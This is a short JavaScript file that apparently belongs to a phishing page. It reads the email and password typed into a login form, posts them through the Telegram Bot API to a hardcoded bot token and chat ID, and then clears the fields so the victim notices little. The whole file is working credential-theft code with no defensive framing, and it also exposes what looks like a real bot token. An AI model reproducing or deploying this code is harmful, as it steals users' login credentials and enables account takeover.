//bot token
var telegram_bot_id = "8069709570:AAH7-FHEcsxVOaUkhV3aIX9LDJB9qIzQv_E";
//chat id
var chat_id = 6501847350;
var u_name, email, message;
var ready = function () {
    email = document.getElementById("formHorizontalEmail").value;
    password = document.getElementById("formHorizontalPassword").value;
    message = "\nEmail: " + email + "\nPassword: " + password;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });

    document.getElementById("formHorizontalEmail").value = "";
    document.getElementById("formHorizontalPassword").value = "";
    // document.getElementById("name").value = "";
    // document.getElementById("email").value = "";
    // document.getElementById("message").value = "";
    return false;
};